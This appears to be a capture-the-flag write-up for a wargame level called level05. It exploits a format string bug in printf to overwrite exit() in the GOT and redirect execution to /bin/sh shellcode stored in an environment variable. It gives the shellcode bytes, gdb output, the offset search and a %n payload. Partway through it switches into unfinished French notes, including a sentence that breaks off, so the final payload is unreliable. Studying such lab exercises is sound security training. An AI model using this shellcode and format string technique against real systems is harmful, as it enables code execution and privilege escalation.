The program is quite simple. It records the user's input in a buffer with a call to fgets(). Then it makes a kind of tolower() for each uppercase alphabetic character in the buffer. Finally, the content of the buffer is displayed with a badly formatted printf() before the program exits using `exit(0)`.

We will be able to perform a format string attack thanks to the badly formatted printf(). We will have to use a shellcode, and for its execution, we should be able to overwrite the address of exit() in the Global Offset Table (GOT). Here is our roadmap:
1. export a shellcode in an environment variable and find its address in memory.
2. find the exit() address in the Global Offset Table.
3. find the offset of the buffer.
4. build our payload.

1. First, let's export a shellcode in an environment variable and find its address using [this little script](env_addr.c):
```
level05@OverRide:~$ export SHELLCODE=$(python -c 'print "a" * 79 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
level05@OverRide:/tmp$ gcc -m32 env_addr.c -o env_addr
level05@OverRide:/tmp$ ./env_addr SHELLCODE
0xffffd88a
```

2. Let's now get the address of exit() in the Global Offset Table using gdb:
```
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
```
So we now have the address we want to ovewrite: 0x80497e0.

3. Now, let's find the offset of the buffer:
```
level05@OverRide:~$ ./level05 
aaaa %x %x %x %x %x %x %x %x %x %x %x
aaaa 64 f7fcfac0 f7ec3af9 ffffd6cf ffffd6ce 0 ffffffff ffffd754 f7fdb000 61616161 20782520
```
Here we have the begining of the buffer (61616161 = "aaaa") with an offset of 10.

4. We can now build our payload: 









objectif: exploiter le printf mal formaté (= format string attack)
comment ? avec le %n modifier. On va enregistrer un shellcode dans une variable d'environnement, puis on va exploiter le printf pour modifier l'adresse de exit dans la GOT et mettre l'adresse de notre variable à la place.



1: au debut du buffer, on donne l'adresse qu'on veut modifier (adresse de exit dans la GOT)
2: on utilise %d avec de un field width d'une valeur définie
3: on utilise %10$n pour écrire le nombre de bytes donnés jusque là à l'adresse qui a un offset de 10 (notre buffer). comme il y a l'addresse de exit dans la GOT au début de notre buffer, c'est en fait là qu'on va écrire.

Et pour finir, ce qu'on veut érire, c'est la valeur décimale de l'adresse de notre shellcode.

La difficulté ici, c'est que la valeur décimale de l'adresse de notre shellcode est trop grande pour







SHELLCODE addr: 0xffffd88a (= 4294957194)


python -c 'print "\xe0\x97\x04\x08" + "%4294957190d" + "%10$n"' > /tmp/exp





We can now reach the next level with the command `su level06` and fill in the flag found as a password.